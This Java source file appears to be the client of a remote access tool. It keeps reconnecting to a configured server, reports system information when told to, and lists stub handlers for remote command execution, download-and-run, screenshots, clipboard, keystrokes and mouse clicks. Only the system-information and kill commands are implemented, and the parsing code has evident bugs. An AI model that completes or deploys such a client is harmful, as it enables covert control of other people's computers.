/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ccsurat.jclient;

import java.io.*;
import java.net.*;

/**
 *
 * @author gotoel
 */
public class NetworkManager {
    
    private String serverIP;
    private int serverPort;
    
    private ClientMainForm mainForm;
    
    private Socket client;
    private InputStream netInputStream;
    private OutputStream netOutputStream;
    private String curData = "";
    
    private boolean isConnected;
    public NetworkManager(ClientMainForm form, String IP, int port)
    {
        this.mainForm = form;
        this.serverIP = IP;
        this.serverPort = port;
        
        isConnected = false;
    }
    
    public NetworkManager(String IP, int port)
    {
        this.serverIP = IP;
        this.serverPort = port;
        
        isConnected = false;
    }
    
    public void Start()
    {
        Log("Connecting to server: " + serverIP + ":" + serverPort);
        while(true)
        {
            while(!isConnected)
            {
                try {
                    client = new Socket(serverIP, serverPort);
                    netInputStream = client.getInputStream();
                    netOutputStream = client.getOutputStream();
                    
                    isConnected = true;
                    Log("Connection successful!");
                    
                    ListenToCommands();
                } catch(Exception ex)
                {
                    System.out.println("NetworkManager start error to " + serverIP + " : " + ex.toString());
                }
            }  
        }
    }
    
    private void ListenToCommands()
    {
        Log("Listening to commands...");
        try {
            while(!client.isClosed()){
                byte[] bytes = new byte[1024];
                String data = null;
                int i;
                if((i = netInputStream.read(bytes, 0, bytes.length)) != 0)
                {
                    data = new String(bytes, "UTF-8");
                    curData += data;
                    Log("Received data: " + data);
                    
                    Log("CURDATA: " + curData);
                    if(FirstCommandIsClosed(curData))
                        new Thread(() -> HandleData(FirstCommand())).start();
                }
                    
            }
        } catch(Exception ex)
        {
            
        }
        finally
        {
            isConnected = false;
            Log("Connection lost/closed. Retrying connection...");
            Start();
        }
    }
    
    private void HandleData(String data)
        {
            try {
                String command = GetCommand(data);
                Log("Handling command: " + command);
                data = RemoveCommand(data);
                // Split parameters, seperated by |*|.
                String[] prms = new String[0];
                if (!data.isEmpty())
                    prms = data.split("|*|");
                if (!command.contains("SCREENSHOT"))
                    Log("Handling command: " + command);
                switch (command)
                {
                    case "START":
                        Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
                        break;
                    case "KILL":
                        System.exit(0);
                        break;
                    case "RESTART":
                        break;
                    case "MESSAGE":
                        break;
                    case "CLIPBOARD":
                        break;
                    case "REMOTECMD":
                        break;
                    case "DOWNLOADRUN":
                        break;
                    case "SCREENSHOT":
                        break;
                    case "MONITORS":
                        break;
                    case "PIANO":
                        break;
                    case "WINDOWS":
                        break;
                    case "WINDOW":
                        break;
                    case "MOUSECLICK":
                        break;
                    case "KEYPRESS":
                        break;
                }
            } catch(Exception ex)
            {
                Log("Could not handle data: " + data + "\nReason: " + ex.toString());
                ex.printStackTrace();
            }
        }
    
    // Gets command tag
        private String GetCommand(String text)
        {
            Log("GetCOmmand: " + text);
            text = text.substring(2, text.indexOf("]"));
            return text;
        }

        // Removes command tag from data
        private String RemoveCommand(String data)
        {
            data = data.substring(data.indexOf("]]") + 2);
            data = data.substring(0, data.lastIndexOf("[") - 1);
            return data;
        }

        // Checks if first command in data is closed.
        private boolean FirstCommandIsClosed(String data)
        {
            String openCommandTag = data.substring(0, data.indexOf("]") + 2);
            Log("FirstCommandIsClosed opentag: " + openCommandTag);
            openCommandTag = data.substring(2, openCommandTag.length() - 2);
            String closeCommandTag = "[[/" + openCommandTag + "]]";
            Log("FirstCommandIsClosed closedtag: " + closeCommandTag);
            return data.contains(closeCommandTag);
        }

        // Gets the first command in data.
        private String FirstCommand()
        {
            String openCommandTag = curData.substring(0, curData.indexOf("]") + 2);
            openCommandTag = curData.substring(2, openCommandTag.length() - 2);
            String closeCommandTag = "[[/" + openCommandTag + "]]";
            String temp = curData.substring(0, curData.indexOf(closeCommandTag) + closeCommandTag.length());
            curData = curData.substring(temp.length());
            Log("FIRST COMMAND: " + temp);
            return temp;
        }
    
    
    public void Write(String data)
    {
        try {
            byte[] msg = data.getBytes();
            netOutputStream.write(msg, 0, msg.length);
            Thread.sleep(20);
            Log("Data sent: " + data);
        } catch(Exception ex)
        {
            Log("Error sending data: " + ex.toString());
            
        }
    }
    
    private void Log(String s)
    {
        try {
        mainForm.Log(s);
        } catch(Exception ex)
        {
            System.out.println(s + "\n");
        }
    }
}

